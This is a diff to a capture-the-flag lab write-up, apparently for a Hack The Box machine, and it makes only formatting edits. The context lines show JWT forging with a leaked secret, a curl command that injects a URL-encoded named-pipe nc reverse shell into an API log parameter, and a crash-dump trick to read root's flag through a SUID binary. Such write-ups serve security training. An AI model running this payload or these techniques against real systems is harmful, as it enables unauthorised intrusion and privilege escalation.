@@ -163,6 +163,7 @@ Checking in the `local-web` directory, there are two hidden files: a `.git` and 
 ## JWT Forging
 
 Using jwt.io and the JWT token I got with "testuser", I will try to forge a new one with `name="theadmin"` and the `TOKEN_SECRET=secret`(email doesn't really matter, since it checks only if `name="theadmin"`).
+
 ![jwtsecret](img/jwtfake.png)
 Then I will try to login with forged JWT token with `TOKEN_SECRET=secret`
 ```
@@ -176,6 +177,7 @@ Go back to that commit with:
 
 
 Now I can forge the JWT token, this time with the real `TOKEN_SECRET`.
+
 ![jwtlegit](img/jwtlegit.png)
 
 and now login with it
@@ -197,7 +199,7 @@ and response is `"80bf34c fixed typos 🎉\n0c75212 now we can view logs from se
 curl -X GET -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.7XoBvpYsxSS4z1nQzHgCmkzGWn5quqV1orfQEPJ9038' -i 'http://10.10.11.120/api/logs?file=;rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.74%204242%20%3E%2Ftmp%2Ff'
 ```
 
-I got the reverse shell and the **User Flag** ✔️!!
+I got the reverse shell and the **User Flag** ✔️!!!
 
 # Privillege Escalation
 
@@ -206,19 +208,22 @@ User *"dasith"* doesn't seem to have any `sudo` rights. So I will search for any
 `find / -type f -perm -u=s 2>/dev/null`
 
 Find `/opt/count` and visiting `/opt` there is a .c file also.
+
 ![code](img/code.png)
 
 This program, reads a path from user input, loads it in it's memory and uses dircount or filecount to get some stats and it lets user save the results in a file. The SUID bit is dropped before writing to the file(`setuid(getuid());`), so I can't really write anything in a file I don't have the permissions to do so.  The `prctl(PR_SET_DUMPABLE, 1);` produces a dump file if the program crashes in the `/var/crash` directory. That means, that if I crash the program while it executes, I can see in the dump file, the contents of the file I gave to it.
 
 So I can run the `./count` and give it as input the `/root/root.txt` file and then after it executes the `prctl`, I can kill it from another terminal and read the root flag n the dump file.
 
-First, run the executable with `/root/root.txt` as input:
+First, run the executable with `/root/root.txt` as input.
+
 ![shell2](img/shell2.png)
 
-In an other terminal, I find the PID of the process and kill it:
+In an other terminal, I find the PID of the process and kill it.
+
 ![shell1](img/shell1.png)
 
-I can unpack the crash file created:
+I can unpack the crash file created.
 
 ![unpack](img/unpack.png)
 
